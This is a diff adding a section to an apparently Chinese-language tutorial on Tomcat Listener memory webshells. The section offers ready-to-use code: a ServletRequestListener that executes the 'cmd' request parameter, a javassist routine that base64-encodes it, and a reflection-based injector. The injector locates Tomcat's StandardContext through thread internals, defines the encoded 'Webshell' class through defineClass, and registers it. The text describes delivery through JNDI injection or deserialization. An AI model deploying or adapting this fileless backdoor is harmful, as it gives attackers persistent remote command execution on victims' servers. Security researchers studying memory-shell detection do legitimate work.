@@ -191,3 +191,211 @@ Object listeners[]={new TestListener()}; //这种写法导致了覆盖了所有�
 context.addApplicationEventListener(listeners);
 ```
 
+<h1 id="cZYlj">四.实战中Listener</h1>
+
+```
+jsp就不多讲了基本就是文件上传，但是依旧需要文件落地，其实就是借助如JNDI注入或者通过反序列化在打内存马的方式，
+下面我写好了可以直接用，首先需要准备一个恶意的Listener(代码一),接着生成base64(代码二)，
+再通过ClassLoader转换成可执行类执行内存马(代码三)。
+```
+
+```java
+Listener1.java
+
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+
+
+public class Listener1 implements ServletRequestListener {
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+        ServletRequestListener.super.requestDestroyed(sre);
+    }
+
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        ServletRequest request = sre.getServletRequest();
+        HttpServletRequest sre1 = (HttpServletRequest) request;
+        String name = sre1.getParameter("cmd");
+        try {
+            Process exec = Runtime.getRuntime().exec(name);
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
+}
+```
+
+```java
+base.java
+
+import javassist.ClassPool;
+import javassist.CtClass;
+
+import java.util.Base64;
+
+public class Base {
+    public static void main(String[] args) throws Exception {
+        ClassPool aDefault = ClassPool.getDefault();
+        CtClass listen = aDefault.get("Listener1");
+        byte[] bytecode = listen.toBytecode();
+        String s = Base64.getEncoder().encodeToString(bytecode);
+        System.out.println(s);
+    }
+}
+
+```
+
+```java
+
+
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Iterator;
+import org.apache.catalina.core.StandardHost;
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.ServletRequestListener;
+
+public class Listeners2 {
+    String uri;
+    String serverName;
+    StandardContext standardContext;
+    public Object getField(Object object, String fieldName) {
+        Field declaredField;
+        Class clazz = object.getClass();
+        while (clazz != Object.class) {
+            try {
+
+                declaredField = clazz.getDeclaredField(fieldName);
+                declaredField.setAccessible(true);
+                return declaredField.get(object);
+            } catch (NoSuchFieldException | IllegalAccessException e) {
+
+            }
+            clazz = clazz.getSuperclass();
+        }
+        return null;
+    }
+
+    public Listeners2() {
+        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
+        Object object;
+        for (Thread thread : threads) {
+
+            if (thread == null) {
+                continue;
+            }
+            if (thread.getName().contains("exec")) {
+                continue;
+            }
+            Object target = this.getField(thread, "target");
+            if (!(target instanceof Runnable)) {
+                continue;
+            }
+
+            try {
+                object = getField(getField(getField(target, "this$0"), "handler"), "global");
+            } catch (Exception e) {
+                continue;
+            }
+            if (object == null) {
+                continue;
+            }
+            java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
+            Iterator iterator = processors.iterator();
+            while (iterator.hasNext()) {
+                Object next = iterator.next();
+
+                Object req = getField(next, "req");
+                Object serverPort = getField(req, "serverPort");
+                if (serverPort.equals(-1)){continue;}
+
+                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
+                this.serverName = (String) getField(serverNameMB, "strValue");
+                if (this.serverName == null){
+                    this.serverName = serverNameMB.toString();
+                }
+                if (this.serverName == null){
+                    this.serverName = serverNameMB.getString();
+                }
+
+                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "decodedUriMB");
+                this.uri = (String) getField(uriMB, "strValue");
+                if (this.uri == null){
+                    this.uri = uriMB.toString();
+                }
+                if (this.uri == null){
+                    this.uri = uriMB.getString();
+                }
+
+                this.getStandardContext();
+                return;
+            }
+        }
+    }
+
+    public void getStandardContext() {
+        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
+        Object object;
+        for (Thread thread : threads) {
+            if (thread == null) {
+                continue;
+            }
+
+            if (!thread.getName().contains("StandardEngine")) {
+                continue;
+            }
+
+            Object target = this.getField(thread, "target");
+            if (target == null) { continue; }
+            HashMap children;
+
+            try {
+                children = (HashMap) getField(getField(target, "this$0"), "children");
+                StandardHost standardHost = (StandardHost) children.get(this.serverName);
+                children = (HashMap) getField(standardHost, "children");
+                Iterator iterator = children.keySet().iterator();
+                while (iterator.hasNext()){
+                    String contextKey = (String) iterator.next();
+                    if (!(this.uri.startsWith(contextKey))){continue;}
+                    StandardContext standardContext = (StandardContext) children.get(contextKey);
+                    standardContext.addApplicationEventListener(this.exec());
+
+                    return;
+                }
+            } catch (Exception e) {
+                continue;
+            }
+            if (children == null) {
+                continue;
+            }
+        }
+    }
+    public ServletRequestListener exec() throws Exception {
+
+        String Code="yv66vgAAADQASQoADQAsCwAOAC0KAC4ALwcAMAgAMQsABAAyCgAzADQKADMANQcANgcANwoACgA4BwA5BwA6BwA7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMV2Vic2hlbGw7AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQADc3JlAQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBABJyZXF1ZXN0SW5pdGlhbGl6ZWQBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEABHNyZTEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAARuYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAOQcAPAcAPQcAMAcAPgcANgEAClNvdXJjZUZpbGUBAA1XZWJzaGVsbC5qYXZhDAAPABAMABYAFwcAPAwAPwBAAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAA2NtZAwAQQBCBwBDDABEAEUMAEYARwEAE2phdmEvbGFuZy9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwADwBIAQAIV2Vic2hlbGwBABBqYXZhL2xhbmcvT2JqZWN0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAEGphdmEvbGFuZy9TdHJpbmcBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEADAANAAEADgAAAAMAAQAPABAAAQARAAAALwABAAEAAAAFKrcAAbEAAAACABIAAAAGAAEAAAANABMAAAAMAAEAAAAFABQAFQAAAAEAFgAXAAEAEQAAAD4AAgACAAAABiortwACsQAAAAIAEgAAAAoAAgAAABEABQASABMAAAAWAAIAAAAGABQAFQAAAAAABgAYABkAAQABABoAFwABABEAAADQAAMABgAAAC4rtgADTSzAAAROLRIFuQAGAgA6BLgABxkEtgAIOgWnAA86BbsAClkZBbcAC7+xAAEAFAAeACEACQADABIAAAAiAAgAAAAWAAUAFwAKABgAFAAaAB4AHQAhABsAIwAcAC0AHgATAAAAPgAGACMACgAbABwABQAAAC4AFAAVAAAAAAAuABgAGQABAAUAKQAdAB4AAgAKACQAHwAgAAMAFAAaACEAIgAEACMAAAAcAAL/ACEABQcAJAcAJQcAJgcAJwcAKAABBwApCwABACoAAAACACs=";
+        byte[] decode = Base64.getDecoder().decode(Code);
+        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+        Method declaredMethod1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+        declaredMethod1.setAccessible(true);
+        Class invoke = (Class)declaredMethod1.invoke(contextClassLoader,  decode, 0, decode.length);
+        ServletRequestListener o = (ServletRequestListener) invoke.newInstance();
+        return o;
+
+
+    }
+}
+
+```
+
